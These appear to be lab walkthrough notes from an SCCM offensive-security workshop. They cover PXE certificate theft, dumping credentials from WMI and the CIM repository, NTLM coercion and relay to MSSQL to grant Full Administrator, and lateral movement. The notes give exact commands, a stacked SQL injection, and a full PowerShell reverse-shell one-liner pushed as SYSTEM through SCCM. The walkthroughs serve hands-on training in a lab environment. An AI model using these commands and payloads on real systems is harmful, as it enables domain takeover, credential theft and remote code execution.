
Practice Labs:
1. https://dashboard.snaplabs.io/templates/121fda0a-6cc3-4889-bee3-2fe83856f530
2. https://github.com/Orange-Cyberdefense/GOAD
## Lab Guide - # LAB 1: PXE ABUSE

![[Pasted image 20240814015853.png]]
### Walkthroughs

 1. Log in to the initial access host

Use the student portal to log in to `SPHERE#` with the provided credentials.

1. In the student portal, select the `Desktop` tab.
2. In the list of available systems, select `SPHERE#` (where `#` is your student number).
3. You’ll be logged into `SPHERE#`.

 2. Discover SCCM site systems on the network

With access to the domain, we can query the LDAP service on a domain controller for information related to SCCM. First, we’ll use SCCMHunter to enumerate systems with the `Full Control` permission on the `System Management` container, which allows SCCM site servers to update resources such as site assignments and management point locations in Active Directory.

1. Open a command shell on `SPHERE#` as `testsubject#` (where `#` is your student number).
2. Navigate to the `testsubject#` home directory by executing `cd ~/tools/sccmhunter`.
3. Execute `source venv/bin/activate` to enter the Python virtual environment where the tool’s dependencies are installed.
4. Zoom out twice so the output will fit in the console window using `CTRL` + `-`.
5. Execute the following, where `X` is your team/range number and `#` is your student number:

```
python3 ~/tools/sccmhunter/sccmhunter.py find -dc-ip 10.1.X.100 -d APERTURE.LOCAL -u TESTSUBJECT# -p BlackMesa00# -debug
```

The results will indicate that `atlas.aperture.local` is a potential site server.

Note: The `SharpSCCM.exe get site-info` command can also be used to query Active Directory for potential site server names from Windows systems.

 3. Enumerate the services available on the primary site server

Site servers often host additional SCCM site system roles that may be useful to attackers, such as the `Distribution Point` role, which hosts software for SCCM clients to download and install and may support PXE boot for operating system deployment (OSD). Now that we have identified `ATLAS` as a site server, what other roles can we identify on the system?

1. In the terminal window running as `testsubject#` where the Python virtual environment is activated, execute `python3 ~/tools/sccmhunter/sccmhunter.py smb -dc-ip 10.1.X.100 -d APERTURE.LOCAL -u TESTSUBJECT# -p BlackMesa00# -debug`, where `X` is your team/range number and `#` is your student number.

Note that `ATLAS` is hosting the distribution point site system role, which opens up additional opportunities for abuse. Specifically, if the distribution point supports PXE, it may allow new systems to obtain a client authentication certificate during operating system deployment to allow seamless installation of the SCCM client software. This certificate information is stored in a media variables file ending with `boot.var` that may or may not be encrypted with a password. PXE-enabled distribution points will respond to DHCP requests to PXE boot with the media variables file location, and we can access the network share containing this file via TFTP without domain credentials.

`SCCMHunter` will locate and download this file for us, but additional action may be required to recover the client authentication certificate within.

 4. Obtain a PXE client authentication certificate from the distribution point

We can use `pxethiefy` (or `PXEThief` if DHCP is configured to forward PXE requests) to locate the `boot.var` file on the distribution point and attempt to decrypt it using a blank password. If a blank password is not found, `pxethiefy` will generate a hash from the file that can be cracked using `hashcat` to recover the contents of the media variables file.

1. Open a command shell on `SPHERE#` as `testsubject#` (where `#` is your student number).
2. Execute `sudo python3 ~/tools/pxethiefy/pxethiefy.py explore -i eth0 -a atlas.aperture.local`, entering the provided `TESTSUBJECT#` password if prompted.

Since a blank password was used to protect the `boot.var` file in the lab, `pxethiefy` will recover the client authentication certificate used for OSD from the media variables file and display a `SharpSCCM` command that can leverage the certificate to query a management point for additional credentials.

 5. Use the certificate to dump secrets from the management point

With access to the client authentication certificate recovered from the media variables file, we can query a system hosting the `Management Point` SCCM site system role for policies that are applied to new systems undergoing OSD. Policies marked as `secret` are encrypted and may contain credentials, such as:

- network access accounts (NAAs), which hosts that are not AD-joined use to communicate with distribution points;
- task sequences, which instruct clients to perform a sequence of actions and may run as a specific domain account; and/or
- collection variables, which may be used to make domain credentials available to a particular device collection.

Often, task sequences used for OSD include local Administrator account credentials and/or domain join account (DJA) credentials.

Luckily for attackers, secret policies are encrypted using a key that is sent in the same response that contains the encrypted policy. After clients decrypt these secrets, they are stored in the local Windows Management Instrumentation (WMI) repository using Windows Data Protection API (DPAPI) encryption. We can request secret policies from a management point using the media variables certificate.

To do this, we may need access to a Windows machine, as no Linux tooling we’re aware of allows the user to specify a certificate file or blob to request policies from a management point yet (we’re working on it!). We could set up a SOCKS proxy on our Linux machine and proxy in `SharpSCCM` to run the command that was output by `pxethiefy`, or we could coerce NTLM authentication from an SCCM client and relay it to a management point to dump secrets, but maybe there’s lower-hanging fruit to be found.

 6. Triage distribution point shares that allow anonymous authentication

When setting up distribution points, SCCM administrators have the option to “Allow clients to connect anonymously” for access to the shares that house the SCCM content library. It’s possible that null sessions may be permitted to SMB shares on these machines as well.

1. In the open terminal on `SPHERE#`, run `smbclient --list ATLAS`, supply a blank password when prompted, and note the presence of several SMB shares on the distribution point.
2. Run `smbclient //ATLAS/<share_name>`, then `ls` and `cd` at the `smbclient` prompt to navigate the directories, noting that `REMINST` is readable.

After cruising the share for a while, you notice that there is a PowerShell script, `fileshare_setup.ps1`, in the `REMINST\SMSTemp` directory.

1. Navigate to the directory by executing the `cd SMSTemp` command at the `smbclient` prompt.
2. Run the `get fileshare_setup.ps1` command to retrieve the file, which will copy the file to your current directory.
3. Exit `smbclient` with `exit` then `cat fileshare_setup.ps1` to view the contents of the file.

In the contents of the file, you discover cleartext Active Directory domain credentials. Let’s find out what they can access.

 7. Move laterally to an SCCM client using the network access account

For the sake of time and everyone’s sanity, we are simulating lateral movement here. Rather than using a nested remote management protocol like RDP or WinRM within a Guacamole session, you may use Guacamole to access `SENTRY#` as `TESTSUBJECT#` (a user account without local Administrator privileges), then use the `runas /user:APERTURE\NETWORKACCESS [executable]` command to leverage your new admin account’s privileges. This process can be repeated as you gain access to additional accounts and using different executables.

1. In the student portal, select the `Desktop` tab.
2. In the list of available systems, select `SENTRY#` (where `#` is your student number) to gain access to the SCCM client device as `TESTSUBJECT#`.
3. Open PowerShell.
4. Execute `runas /user:APERTURE\NETWORKACCESS powershell`, entering the password you obtained for `NETWORKACCESS` when prompted.

## # LAB 2: CLIENT TRIAGE
![[Pasted image 20240814015952.png]]

### Scenario

You obtained Network Access Account (NAA) credentials by requesting the machine policy from the management point and deobfuscating secrets. After further enumeration of the NAA’s privileges, you determined that it is a local admin on `SENTRY#`, a Windows system on the same subnet as your initial access host. Now that you’ve moved laterally to `SENTRY#`, what valuable information can you obtain by triaging the box?

## Objectives

- Dump current secrets from an SCCM client via WMI
- Dump old secrets from an SCCM client by reading the CIM repository file
- Gain `Full Administrator` access to SCCM
- Validate your new privileges

Please ask for help if you have questions!

An `#` after a system name represents your student number. For example, if you’re student 3, `SPHERE#` represents `SPHERE3`

## Lab Guide

### Walkthroughs

 1. Dump current secrets from the SCCM client via WMI

Now that we’ve “moved” to `SENTRY#`, we can triage the system for additional valuable information. First, we’ll use the WMI Query Language (WQL) to query the local WMI database for objects in the `root\ccm\policy\Machine\ActualConfig` namespace. Currently configured NAAs are stored in the `CCM_NetworkAccessAccount` class. SharpSCCM will extract any DPAPI-protected blobs that are stored there and decrypt them using the Windows Data Protection API (DPAPI) SYSTEM masterkey. In order to decrypt this masterkey, we must first retrieve the `DPAPI_SYSTEM` LSA Secret. This secret is stored in the `HKLM\SECURITY\Policy\Secrets\DPAPI_SYSTEM\CurrVal\` registry key. By default, only the `SYSTEM` account can read this key, but the local `Administrators` group is granted the `WriteDACL` privilege. This means we can either:

- escalate to a `SYSTEM` context using traditional methods, such as token duplication, or
- use our `WriteDACL` privilege to grant ourselves `Read` privilege on the registry key (SharpSCCM’s default option).

1. In the student portal, select the `Desktop` tab.
2. In the list of available systems, select `SENTRY#` (where `#` is your student number) to gain access to the SCCM client device as `TESTSUBJECT#`.
3. Open PowerShell.
4. Execute `runas /user:APERTURE\NETWORKACCESS powershell`, entering the password you obtained for `NETWORKACCESS` when prompted, to open an elevated PowerShell Window.
5. Execute `C:\Tools\SharpSCCM.exe local secrets -m wmi` OR `C:\Tools\SharpSCCM.exe local secrets -m wmi --get-system`.

You will see the credentials for `APERTURE\NETWORKACCESS` here because it is the currently configured NAA. But we already knew that because we obtained those creds directly from the policy!

 2. Dump old secrets from the SCCM client by reading the CIM repository file

Even though WMI did not contain any new secrets for us, that does not mean the system did not once have more fruitful secrets! Due to the way Common Information Model (CIM) and WMI clean up objects in the CIM repository (`C:\Windows\System32\Wbem\Repository\OBJECTS.DATA`), it is entirely possible that legacy credentials remain behind on disk, even after the NAA has been rotated!

For example, organizations may configure a domain administrator (DA) account as the NAA and later learn that was a TERRIBLE idea! In an effort to do the right thing, they delete the DA account from the list of NAAs in the SCCM console, then configure a new NAA with only the minimum privileges necessary (read access to distrubution points and no interactive logon rights). All clients will retrieve machine policies containing the new minimally-privileged account credentials and store them locally. This will also clean up the DA account object in WMI on the clients, but not necessarily from the CIM repository.

1. Open PowerShell.
2. Execute `runas /user:APERTURE\NETWORKACCESS powershell`, entering the password you obtained for `NETWORKACCESS` when prompted, to open an elevated PowerShell Window.
3. Execute `C:\Tools\SharpSCCM.exe local secrets -m disk` or `C:\Tools\SharpSCCM.exe local secrets -m disk --get-system`.

Now you’ll notice additional secrets were decrypted after they were found in the CIM repository.

 3. Gain Full Administrator access to SCCM

Let’s check whether this old NAA is granted any Security Roles in SCCM.

1. Open PowerShell.
2. Execute `runas /user:APERTURE\sccmadmin powershell`, entering the password you obtained for `SCCMADMIN` when prompted, to open an elevated PowerShell Window.
3. Execute `C:\Tools\SharpSCCM.exe get admins`.

Note that the `sccmadmin` account is granted the `Full Administrator` role in SCCM

## # LAB 3: SITE TAKEOVER

![[Pasted image 20240814020039.png]]
## Scenario

The old network access account you found in the CIM repository is granted the `Full Administrator` security role in SCCM, allowing you to execute actions on all clients in the site. But what if you weren’t so lucky? Can you find another way to grant your `TESTSUBJECT#` account the `Full Administrator` role to take over the site?

## Objectives

- Identify that the prerequisites for site takeover are in place
- Coerce NTLM authentication from the primary site server to your relay server
- Relay the NTLM authentication to your relay target, the site database server
- Grant the `Full Administrator` role to a user account you control
- Validate your new privileges

Please ask for help if you have questions!

An `X` in a system IP address represents your team/range number. For example, if you’re on team/range 3, `10.1.X.51` represents `10.1.3.51`

A `#` after a system name or in a system IP address represents your student number. For example, if you’re student 2, `SPHERE#` represents `SPHERE2`

If you’re on team/range 3 and you’re student 2, `10.1.X.#` represents `10.1.3.2`.

## Lab Guide

### Overview

Next, we are going to attempt to take over the SCCM site that our SCCM client device, `SENTRY#`, belongs to by adding the SCCM `Full Administrator` role to a user account we control. We know that the computer account for the primary site server (`ATLAS$`) is required to be a member of the local `Administrators` group on the site database server, so if we can gain access to the database as `ATLAS$`, we can access the site’s MSSQL database and manually add ourselves to the `Full Administrator` role. Then, we can perform any action we want against the SCCM server or its clients.

To access the site database as `ATLAS$`, we can coerce NTLM authentication from `ATLAS$` and relay it to the MSSQL service on the site database server. There are a few ways to do this. The most likely to succeed in real enterprise environments is coercion via remote procedure call (RPC) services that the primary site server may expose to the network via server message block (SMB).

In order for this attack to succeed:

1. The primary site server must be reachable via SMB from a system we control
2. Our relay server must be reachable via SMB from the primary site server
3. The site database server must be reachable via MSSQL from a system we control
4. Extended protection for authentication (EPA) must not be enabled on the site database
5. NTLM authentication must not be disabled on the primary site server or site database

Coercing automatic site-wide client push installation by contacting a management point via HTTP(S) may also be possible. If we coerce NTLM authentication to an IP address via SMB, the site server will attempt to authenticate with each configured client push installation account, followed by its domain computer account. If we coerce NTLM authentication to a NetBIOS name via HTTP (if WebClient is running), the site server will attempt to authenticate with each configured client push account. If there are no configured client push installation accounts, the site server will authenticate using its domain computer account.

We could also coerce and relay NTLM authentication from the primary site server to the SMB service on the site database server to take over the system, then access the database. However, there are fewer overall steps for takeover when the MSSQL service is accessible and does not require EPA.

To conduct a site takeover attack targeting the MSSQL service on the site database server, we first need to identify:

- the three-character site code for the SCCM site
- the NetBIOS name, FQDN, or IP address of the primary site server
- that the primary site server is reachable via SMB from our relay server
- the NetBIOS name, FQDN, or IP address of the site database server
- that the site database server is reachable via MSSQL from our relay server
- the SID of the user account to grant the `Full Administrator` role

### Walkthroughs

To prevent spoilers and to make sure everybody can complete all of the steps for this exercise, please grant additional roles only to your provided `TESTSUBJECT#` account.

 1. Identify the three-character site code for the SCCM site

1. In the student portal, select the `Desktop` tab.
2. In the list of available systems, select `SENTRY#` to gain access to the SCCM client device as `TESTSUBJECT#` (where `#` is your student number).
3. Open a PowerShell command prompt.
4. Execute `C:\Tools\SharpSCCM.exe local site-info`.

Note the three character site code, `PS1`, that appears in the output after “SMS:”.

 2. Identify the NetBIOS name, FQDN, or IP address of the primary site server

We completed this task in Lab1 using `SCCMHunter` from a Linux box, but let’s try again using `SharpSCCM` from a Windows box. As a reminder, by default, the primary site server’s domain computer account is granted `Full Control` (a.k.a. `GenericAll`) permissions on the `System Management` container in Active Directory. We can query this information via LDAP to identify site servers.

1. In the open PowerShell window on `SENTRY#`, execute `C:\Tools\SharpSCCM.exe get site-info -d aperture.local`.

Note that `ATLAS.APERTURE.LOCAL` is likely the primary site server based on its permissions on the `System Management` container.

 3. Check if the site server is reachable from our relay server via SMB

1. In the student portal, select the `Desktop` tab.
2. In the list of available systems, select `SPHERE#` to gain access to the initial access host as `testsubject#` (where `#` is your student number).
3. Open a Bash command prompt (Ctrl + Alt + T).
4. In the open terminal window, run `nmap -Pn -p445 ATLAS.APERTURE.LOCAL`.

Note that TCP port 445 (SMB) is open on `ATLAS`, the primary site server, from `SPHERE#`, our relay server.

 4. Check if the site database is reachable from our relay server via MSSQL

There is not a good method that we are aware of to obtain the FQDN, IP address, or NetBIOS name of the site database from a client, but there are a few things we can try.

First, in some environments, the site database lives on the same server as the primary site server. Assuming there are no firewall rules blocking us, we can tell if this the case by scanning all site servers in a site for an open MSSQL port on TCP/1433. However, because coerced NTLM authentication can’t be relayed back to the system it came from, this site configuraion is not susceptible to the attack we want to try.

Next, we can operate on the assumption that an organization has a standard naming convention and that the site database server will share the same prefix as the management points that are often published to Active Directory or the distribution points and SMS Providers we can identify based on responses from the services they expose. We could also query the domain controller for domain computers and service principal names (SPNs) for MSSQL service accounts to see if they contain strings like “SCCM” or “MCM”. However, these are imperfect solutions and in our lab environment, wouldn’t work.

Another method we could try is to coerce NTLM authentication from the primary site server and relay the authentication to a site system hosting a role that requires connectivity to the site database via MSSQL, such as a management point. Since the primary site server’s domain computer account requires local admin privileges on every other server hosting a site system role, this should work, but these extra steps are not necessary in our lab.

Note: There are [quite a few other site system roles](https://learn.microsoft.com/en-us/mem/configmgr/core/plan-design/hierarchy/ports) that require connectivity to the site database via MSSQL as well.

We can scan the network for systems where TCP port 1433 is open and add them to the list of relay targets, which is the route we are going to take in the lab. This method also accomplishes the next requirement, “Identify that the site database server is reachable from our relay server via MSSQL”.

1. In the open terminal window on `SPHERE#`, execute the `nmap -Pn -p1433 10.1.X.0/24 --open` command, where `X` is your team/range number and `#` is your student number. Note that TCP port 1433 (MSSQL) is open at `10.1.X.51`, the site database server, from `SPHERE#`, our relay server (where `X` is your team/range number and `#` is your student number).

 5. Identify the SID of the user to grant the Full Administrator role

Finally, we need the domain SID of the user we want to grant the SCCM `Full Administrator` role to. To obtain this information:

1. In the open PowerShell window on `SENTRY#`, run `C:\Tools\SharpSCCM.exe local user-sid` (where `#` is your student number).

The results will include the Active Directory SID for your `TESTSUBJECT#` account in hexadecimal format (e.g., `0x010500000000000515000000A575F3C88F95AD18057166EC4F040000`).

 6. Generate the required SQL statements

1. Next, we must generate the SQL statements that will be used to grant our account the desired role in the database. We could do this manually, but SCCMHunter makes it trivial. From `SPHERE#`, run the following:

```
python3 sccmhunter.py mssql -dc-ip 10.1.X.100 -d APERTURE.LOCAL -u 'TESTSUBJECT#' -p 'BlackMesa00#' -debug -tu testsubject# -sc ps1 -stacked
```

Now let’s review the output:

- `SCCMHunter` resolves and converts the SID of our `TESTSUBJECT#` account, like we did with `SharpSCCM` in the previous step
- The stacked SQL queries do several things. Most importantly:
    - Insert our account (SID, LogonName, site code, etc) into the `RBAC_Admins` table
    - Insert extended permissions for our account in the `RBAC_ExtendedPermissions` table

Next, we’ll copy the stacked query for the next step.

 7. Configure ntlmrelayx to relay NTLM authentication to the site database

Next, we are going to configure `ntlmrelayx` to open a SOCKS proxy to the MSSQL service at the IP address of the site database server when incoming NTLM authentication is received via SMB:

1. In the open terminal window on `SPHERE#`, run `sudo su -` to escalate to root (where `#` is your student number).
2. In the root terminal, run the following, where `X` is your team/range number and `#` is your student number (e.g., `10.1.3.201` for team 3 student 1, `10.1.4.202` for team 4 student 2, etc.):

```
ntlmrelayx.py -smb2support -ts -ip 10.1.X.20# -t mssql://10.1.X.51 -q DECLARE @AdminID INT; USE CM_ps1; INSERT INTO RBAC_Admins (AdminSID, LogonName, IsGroup, IsDeleted, CreatedBy, CreatedDate, ModifiedBy, ModifiedDate, SourceSite) SELECT 0x0105000000000005150000001572341725B0DAB8D023E0875A040000, 'APERTURE\testsubject#', 0, 0, '', '', '', '', 'ps1' WHERE NOT EXISTS ( SELECT 1 FROM RBAC_Admins WHERE LogonName = 'APERTURE\testsubject#' ); SET @AdminID = (SELECT TOP 1 AdminID FROM RBAC_Admins WHERE LogonName = 'APERTURE\testsubject#'); INSERT INTO RBAC_ExtendedPermissions (AdminID, RoleID, ScopeID, ScopeTypeID) SELECT @AdminID, RoleID, ScopeID, ScopeTypeID FROM (VALUES  ('SMS0001R', 'SMS00ALL', 29), ('SMS0001R', 'SMS00001', 1), ('SMS0001R', 'SMS00004', 1) ) AS V(RoleID, ScopeID, ScopeTypeID) WHERE NOT EXISTS ( SELECT 1 FROM RBAC_ExtendedPermissions  WHERE AdminID = @AdminID  AND RoleID = V.RoleID  AND ScopeID = V.ScopeID AND ScopeTypeID = V.ScopeTypeID );
```

The output will show that an SMB service was started on TCP port 445 to accept inbound coerced NTLM authentication attempts and relay them to the MSSQL service on the site database server at `10.1.X.51` (where `X` is your team/range number).

 8. Coerce NTLM authentication from the primary site server to your relay server

Now we are going to use PetitPotam to coerce NTLM authentication from the `ATLAS$` domain computer account to our `ntlmrelayx` listener on `SPHERE#`, then relay it to the MSSQL service on the site database server and open a SOCKS proxy. Keep in mind that there are lots of other tools that target Windows RPC servers to coerce authentication from a computer account, such as `SpoolSample` and `Coercer`.

1. Open a second Bash tab (Ctrl + Shift + T) on your `SPHERE#` computer, leaving the first tab where `ntlmrelayx` is running open.
2. In the new terminal window, run the following, where `X` is your team/range number and `#` is your student number (e.g., `10.1.3.201` for team 3 student 1, `10.1.4.202` for team 4 student 2, etc.):

```
python3 ~/tools/PetitPotam/PetitPotam.py -u TESTSUBJECT# -p BlackMesa00# -d APERTURE.LOCAL 10.1.X.20# 10.1.X.50
```

3. In the other open terminal window where `ntlmrelayx` is still running, observe `Authenticating against mssql://10.1.X.51 as APERTURE/ATLAS$ SUCCEED` in the console output, where `X` is your team/range number.

If PetitPotam fails to trigger NTLM authentication, try using another named pipe (instead of the default, `lsarpc`) by adding the `-pipe efsr` flag.

 9. Verify your new privileges by querying the SMS Provider

1. In the open PowerShell window on `SENTRY#`, execute `C:\Tools\SharpSCCM.exe get site-push-settings`.

Note that the SMS Provider responds without an access denied message. You now have complete control of the SCCM site (again)!

SCCMHunter’s `admin` module also automates this functionality:

1. Open a command shell on `SPHERE#` as `testsubject#` (where `#` is your student number).
2. Navigate to `/home/testsubject#/tools/sccmhunter` by executing `cd ~/tools/sccmhunter`.
3. Execute `source venv/bin/activate` to enter the Python virtual environment where the tool’s dependencies are installed.
4. Execute `python3 sccmhunter.py mssql -u TESTSUBJECT# -p BlackMesa00# -d aperture.local -dc-ip 10.1.X.100 -tu TESTSUBJECT# -sc PS1 -stacked`, where `X` is your team/range number and `#` is your student number.
5. In a root command shell on `SPHERE#`, execute `ntlmrelayx.py -smb2support -t mssql://10.1.0.51 -q "<stacked_sql>"​`, replacing the placeholder with the stacked SQL statement in the output of the previous command.
6. In the first command shell, execute `python3 ~/tools/PetitPotam/PetitPotam.py -u TESTSUBJECT# -p BlackMesa00# -d APERTURE.LOCAL 10.1.X.20# 10.1.X.50`, where `X` is your team/range number and `#` is your student number.
7. In the open PowerShell window on `SENTRY#`, execute `C:\Tools\SharpSCCM.exe get site-push-settings` to validate your privileges.

## # LAB 4: LATERAL MOVEMENT

![[Pasted image 20240814020358.png]]
### Walkthroughs

To prevent spoilers and to make sure everybody can complete all of the steps for this exercise, please refrain from executing code on other students’ `SENTRY#` boxes.

 1. Execute calc.exe on your SENTRY# device as the logged on user
 
1. In the student portal, select the `Desktop` tab.
2. In the list of available systems, select `SENTRY#` to gain access to the SCCM client device as `TESTSUBJECT#` (where `#` is your student number).
3. Open a PowerShell command prompt.
4. Execute `runas /user:APERTURE\SCCMADMIN powershell`, then enter the password you recovered from the CIM repository.
5. In the new PowerShell window, execute `C:\Tools\SharpSCCM.exe exec -d SENTRY# -p calc.exe -w 60`.
6. Observe that shortly after the output displays `[+] Waiting 300 seconds for execution to complete...`, the `calc.exe` application is launched in your desktop session on `SENTRY#`.

Note that on occassion, the notification sent from the site server that forces clients to update policy and install pending applications fails. If the application doesn’t execute the first time, try running the `exec` command again.

The execution window is set to five minutes by default to allow change propagation in large enterprise environments, after which `SharpSCCM` deletes the changes from SCCM. In massive environments, this may not be long enough. In our lab, it is likely overkill. You can configure the number of seconds `SharpSCCM` will wait before cleaning up using the `-w <int>` option to specify a wait time.

 2. Identify the device where APERTURE\CHELL is the primary user

1. In the open PowerShell window, run `C:\Tools\SharpSCCM.exe get primary-users -u CHELL`.
2. Observe the value of `ResourceName` for the device where the `UniqueUserName` is `APERTURE\CHELL`, indicating that `APERTURE\CHELL` is the primary user of the `CHELL-PC` device.

 3. Identify the primary user for the CHELL-PC device

1. In the open PowerShell window, run `C:\Tools\SharpSCCM.exe get primary-users -d CHELL-PC`.
2. Observe the value of `UniqueUserName` for the device where the `ResourceName` is `CHELL-PC`, indicating that `APERTURE\CHELL` is the primary user of the `CHELL-PC` device.

 4. Identify the device where APERTURE\CHELL was the last user to log on

1. In the open PowerShell window, run `C:\Tools\SharpSCCM.exe get devices -p LastLogonTimestamp -p LastLogonUserName -p NetbiosName -u CHELL`.
2. Observe the value of `NetbiosName` for the device where the `LastLogonUserName` is `APERTURE\CHELL`, indicating that `APERTURE\CHELL` was the last user to log on to the `CHELL-PC` device.

 5. Gain access to CHELL-PC as CHELL

We have a lot of options for this, but for example, we could:

- host a binary or script on a network share that is accessible from the target device, then deploy an application that is installed from the UNC path of our payload using SCCM;
- execute a PowerShell reverse shell payload;
- backdoor a script or policy our target device will execute (e.g., CMPivot); or
- coerce NTLM authentication from another system where the target user is currently logged in and relay to the target system.

We’re going to use the second option for simplicity’s sake. First, let’s set up a netcat listener to catch our reverse shell like it’s 1995:

1. In the student portal, select the `Desktop` tab.
2. In the list of available systems, select `SPHERE#` to gain access to the initial access host as `testsubject#` (where `#` is your student number).
3. Open a Bash command prompt (Ctrl + Alt + T).
4. In the open terminal window, run `nc -lvp 8443`.

Next, we’ll use `SharpSCCM` to deploy an application containing our reverse shell payload:

1. In the student portal, select the `Desktop` tab.
2. In the list of available systems, select `SENTRY#` to gain access to the SCCM client device as `TESTSUBJECT#` (where `#` is your student number).
3. Open notepad
4. Paste the following payload into notepad, then replace `X` with your team/range number and `#` with your student number (2 instances of each) to send the shell back to the IP address of your `SPHERE#` machine:

```
# Credit: https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1

$cl = New-Object System.Net.Sockets.TCPClient('10.1.X.20#',8443);$st = $cl.GetStream();[byte[]]$by = 0..65535|%{0};while(($i = $st.Read($by, 0, $by.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($by,0, $i);$seb = (iex $data 2>&1 | Out-String );$seb2  = $seb + 'PS ' + (pwd).Path + '> ';$seby = ([text.encoding]::ASCII).GetBytes($seb2);$st.Write($seby,0,$seby.Length);$st.Flush()};$cl.Close();$sm=(New-Object Net.Sockets.TCPClient('10.1.X.20#',8443)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}
```

1. Save the file to the `Public` user’s home directory (e.g., `C:\Users\Public\rev.txt`).
2. In the open PowerShell window running as `SCCMADMIN`, execute the following, replacing the file name/path if necessary (`rev.txt` in this example):

```
$payload = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes((Get-Content -Path 'C:\Users\Public\rev.txt' -Raw)))
```

3. Execute `C:\Tools\SharpSCCM.exe exec -d CHELL-PC -p "powershell -enc $payload" -w 60 -s` to run our reverse shell with `SYSTEM` privileges.

After a minute or so, you should receive a reverse shell from `CHELL` on your netcat listener on `SPHERE#`.

Congrats! You just owned your target!

Note: Please refrain from using any other accounts to log on to `CHELL-PC`, as this attack path relies on `CHELL` being the currently logged-on user.

------------

## ## Labs

As fun as it is to stand up SCCM from scratch /s, we recommend using an automated deployment solution if you’d like to get started quickly. Here are the options we’re currently aware of that can stand up a lab in just a few clicks and hours:

- [@an0n_r0](https://twitter.com/an0n_r0/status/1687230842601451522) released a [Snap Labs range](https://dashboard.snaplabs.io/templates/121fda0a-6cc3-4889-bee3-2fe83856f530) that can be used to test the majority of SCCM tradecraft covered in this workshop.
- [@M4yFly](https://twitter.com/m4yfly/status/1771643303164891262) released an [SCCM lab for the Game of Active Directory (GOAD) project](https://github.com/Orange-Cyberdefense/GOAD) that can be used with VMware or VirtualBox which also covers a lot of the tradecraft in this workshop.

The following labs are options as well, but do not separate the site database or SMS Provider roles from the primary site server, preventing the use of the majority of takeover techniques:

- [Windows and Office 365 deployment lab kit](https://learn.microsoft.com/en-us/microsoft-365/enterprise/modern-desktop-deployment-and-management-lab?view=o365-worldwide)
- [SCCM Technical Preview Azure Template](https://learn.microsoft.com/en-us/samples/azure/azure-quickstart-templates/sccm-technicalpreview/)
- [AutomatedLab](https://automatedlab.org/en/latest/Wiki/Roles/configurationmanager/)

If you must install SCCM from scratch, for instance if you need a central administration site, secondary site, or less common site system roles, we recommend the following resources that can help you on your journey. Good luck!

- [Windows Noob Step by Step Guides](https://www.windows-noob.com/forums/topic/4045-step-by-step-guides-system-center-2012-r2-configuration-manager/) - Still relevant today despite being posted in 2011
- [Microsoft’s Lab Guide](https://learn.microsoft.com/en-us/windows/deployment/windows-10-poc-sc-config-mgr) - Another good step-by-step guide for installing a lab manually
- [Prajwal Desai](https://www.prajwaldesai.com/) - Tons of how-to guides that dive deep into SCCM internals

## Research
[Misconfiguration-Manager/RESOURCES.md at main · subat0mik/Misconfiguration-Manager · GitHub](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/RESOURCES.md)

[Misconfiguration Manager](https://misconfigurationmanager.com/) is a central, living knowledge base for all known Microsoft Configuration Manager tradecraft and associated defensive and hardening guidance that aims to ease SCCM attack path management​. It contains foundational, offensive, and defensive write-ups for most known techniques​ and introduces a taxonomy to simplify and demystify concepts (à la Certified Pre-Owned)​.

Offensive security practitioners may also benefit from reviewing the list of known and documented [Attack Techniques](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/_attack-techniques-list.md), which identifies the security context and network access that are required for each technique.
Reach out to these folks incase you have any doubts:
![[Pasted image 20240814020737.png]]